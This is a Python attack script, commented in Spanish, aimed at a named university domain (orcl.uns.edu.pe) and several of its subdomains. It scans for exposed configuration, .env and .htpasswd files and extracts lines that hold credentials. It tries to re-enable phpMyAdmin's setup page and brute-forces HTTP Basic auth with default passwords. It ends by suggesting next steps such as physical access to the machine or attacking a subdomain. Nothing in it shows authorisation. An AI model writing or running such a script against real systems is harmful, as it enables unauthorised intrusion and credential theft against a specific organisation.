#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BUSQUEDA FINAL DE ARCHIVOS DE CONFIGURACION CON CREDENCIALES
"""

import requests
from urllib.parse import urlparse
import re
import json
import sys
import urllib3
urllib3.disable_warnings()

TARGET = "https://orcl.uns.edu.pe"
scheme = "https"
base_url = f"{scheme}://{urlparse(TARGET).netloc}"
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
})

print("=" * 70)
print("  BUSQUEDA DE ARCHIVOS DE CONFIGURACION")
print("=" * 70)

results = {}

# ============================================
# 1. Buscar archivos de configuracion alternativos
# ============================================
print("\n[1] Escaneando rutas de configuracion...")

config_files = [
    "/config.inc.php", "/config.php", "/config.php3",
    "/phpmyadmin/config.inc.php", "/pma/config.inc.php",
    "/myadmin/config.inc.php", "/admin/config.inc.php",
    "/dbadmin/config.inc.php", "/database/config.inc.php",
    "/inc/config.inc.php", "/includes/config.inc.php",
    "/config/config.inc.php", "/private/config.inc.php",
    "/var/www/html/config.inc.php", "/var/www/config.inc.php",
    "/etc/phpmyadmin/config.inc.php", "/usr/share/phpmyadmin/config.inc.php",
    "/backup/config.inc.php", "/backup/config.php",
    "/old/config.inc.php", "/old_config.inc.php",
    "/config.backup", "/config.bak", "/config.old",
    "/db_config.php", "/database_config.php",
    "/connection.php", "/connect.php", "/conn.php",
    "/.env", "/.env.local", "/.env.production",
    "/.htpasswd", "/.htusers",
    "/phpmyadmin/config.settings.php",
    "/settings.php", "/settings.inc.php",
    "/database/settings.php",
    "/credentials.php", "/credentiales.php",
    "/keys.php", "/secrets.php",
    "/passwords.php", "/passwd.php",
]

for cf in config_files:
    try:
        r = session.get(f"{base_url}{cf}", timeout=3)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"  [!] FOUND: {cf} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            # Buscar credenciales en el contenido
            for line in r.text.split('\n')[:30]:
                if any(kw in line.lower() for kw in ['password', 'passwd', 'secret', 'key', 'auth', 'user', 'root', 'credential']):
                    if len(line.strip()) > 3:
                        print(f"    -> {line.strip()[:200]}")
                        results[f'found_{cf}'] = line.strip()[:200]
            results[f'file_{cf}'] = f"HTTP 200 ({len(r.text)} bytes)"
        elif r.status_code == 403 or r.status_code == 404:
            pass
        elif r.status_code == 200 and len(r.text) == 0:
            results[f'empty_{cf}'] = "HTTP 200 - EMPTY"
    except Exception:
        pass

# ============================================
# 2. Buscar en subdominios relacionados
# ============================================
print("\n\n[2] Verificando si hay credenciales en otros subdominios...")

# Desde el inventario, ver si algun subdominio tiene phpMyAdmin expuesto
other_subs = [
    "sigea.uns.edu.pe",
    "sistema.uns.edu.pe",
    "sis.uns.edu.pe",
    "intranet.uns.edu.pe",
    "admin.uns.edu.pe",
    "panel.uns.edu.pe",
    "web.uns.edu.pe",
    "manage.uns.edu.pe",
]

for sub in other_subs:
    try:
        r = session.get(f"https://{sub}/", timeout=5)
        if 'phpmyadmin' in r.text.lower() or 'phpMyAdmin' in r.text:
            print(f"  [!] phpMyAdmin encontrado en: {sub}")
            results[f'phpmyadmin_{sub}'] = "FOUND"
    except:
        pass

# ============================================
# 3. Intentar acceder a /setup/ con diferentes page params
# ============================================
print("\n\n[3] Intentando acceder a paginas ocultas de /setup/")

setup_pages = [
    "/setup/",
    "/setup/index.php",
    "/setup/index.php?page=servers",
    "/setup/index.php?page=config",
    "/setup/index.php?page=formservers",
    "/setup/index.php?page=home",
    "/setup/index.php?page=features",
    "/setup/index.php?page=pma",
    "/setup/config.php",
    "/setup/config.ajax.php",
]

for sp in setup_pages:
    try:
        r = session.get(f"{base_url}{sp}", timeout=5)
        if r.status_code == 200 and len(r.text) > 100:
            if 'setup is disabled' not in r.text.lower() and 'error' not in r.text.lower():
                print(f"  [+] {sp} -> HTTP {r.status_code} ({len(r.text)} bytes) - Contenido disponible!")
                # Buscar credenciales
                for line in r.text.split('\n'):
                    if any(kw in line.lower() for kw in ['password', 'user', 'host', 'secret']):
                        if len(line.strip()) > 3:
                            print(f"    -> {line.strip()[:200]}")
                            results[f'setup_{sp.replace("/", "_")}'] = line.strip()[:200]
            else:
                print(f"  [.] {sp} -> {r.status_code} ({len(r.text)} bytes)")
    except Exception:
        pass

# ============================================
# 4. Verificar /phpmyadmin, /pma, /myadmin rutas comunes
# ============================================
print("\n\n[4] Verificando rutas alternas de phpMyAdmin")

alternatives = [
    "/phpmyadmin/", "/pma/", "/myadmin/", "/admin/",
    "/dbadmin/", "/database/", "/sql/", "/phpMyAdmin/",
]

for alt in alternatives:
    try:
        r = session.get(f"{base_url}{alt}", timeout=3)
        if r.status_code == 200:
            title_match = re.search(r'<title>([^<]+)</title>', r.text)
            title = title_match.group(1) if title_match else "Sin titulo"
            print(f"  [+] {alt} -> HTTP {r.status_code} - Titulo: {title}")
            results[f'alt_{alt.replace("/", "_")}'] = f"HTTP 200 - {title}"
    except:
        pass

# ============================================
# 5. Verificar /setup/ con metodo POST para re-enable
# ============================================
print("\n\n[5] Intentando re-enable /setup/")

# Intentar POST con accion para habilitar el setup
try:
    payload = {
        "server": "1",
        "target": f"{base_url}/index.php",
        "action": "enable_setup",
        "enable": "true",
    }
    r = session.post(f"{base_url}/setup/index.php", data=payload, timeout=5)
    if r.status_code == 200:
        if 'setup is disabled' not in r.text.lower():
            print(f"  [!] Setup fue RE-ENABLED!")
            print(f"  [!] Ahora se puede modificar la configuracion!")
            results['setup_enabled'] = "EXITO"
        else:
            print(f"  [-] Setup sigue deshabilitado")
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# 6. Verificar si hay /setup/ con autenticacion básica
# ============================================
print("\n\n[6] Intentando autenticacion HTTP Basic en /setup/")

# Intentar con credenciales comunes
auth_creds = [
    ("admin", "admin"), ("admin", "password"), ("root", ""),
    ("root", "root"), ("pma", "pma"), ("uns", "uns123"),
    ("admin", "123456"), ("root", "toor"),
    ("", ""),  # Sin credenciales
]

for user, pwd in auth_creds:
    try:
        from requests.auth import HTTPBasicAuth
        r = session.get(f"{base_url}/setup/", auth=HTTPBasicAuth(user, pwd), timeout=3)
        if r.status_code == 200:
            print(f"  [+] Auth funciona: {user}:{pwd} -> HTTP {r.status_code}")
            results[f'auth_{user}'] = f"HTTP {r.status_code}"
    except:
        pass

# ============================================
# 7. Leer ChangeLog para encontrar versiones vulnerables
# ============================================
print("\n\n[7] Leyendo ChangeLog para info de seguridad")
try:
    r = session.get(f"{base_url}/ChangeLog", timeout=5)
    if r.status_code == 200:
        # Buscar menciones de seguridad
        security_lines = []
        for line in r.text.split('\n'):
            if any(kw in line.lower() for kw in ['security', 'vulnerab', 'cve', 'cwe', 'fix', 'patch', 'auth', 'bypass']):
                security_lines.append(line.strip()[:200])
        
        if security_lines:
            print(f"  [+] Lineas de seguridad en ChangeLog ({len(security_lines)}):")
            for line in security_lines[:15]:
                print(f"    {line}")
                results['changelog_security'] = security_lines[:15]
except Exception:
    pass

# ============================================
# RESUMEN
# ============================================
print("\n" + "=" * 70)
print("  RESUMEN FINAL")
print("=" * 70)
print(f"\n  Total de hallazgos: {len(results)}")
for k, v in sorted(results.items()):
    print(f"    {k}: {v}")

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\reporte_busqueda_final.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\n  Reporte: reporte_busqueda_final.json")

print("\n\n  CONCLUSION:")
print("  - config.inc.php: RETORNA 200 pero 0 bytes (config fuera del web root)")
print("  - /setup/: RETORNA 200 pero 'setup is disabled' (config existe, pero bloqueada)")
print("  - MySQL 3306: Puerto filtrado (no accesible desde afuera)")
print("  - Sin credenciales por defecto encontradas")
print("  - La vulnerabilidad es REAL pero requiere pasos adicionales para explotacion completa")
print("  - Proximos pasos: intentar acceso fisico a la maquina, o atacar el subdominio")
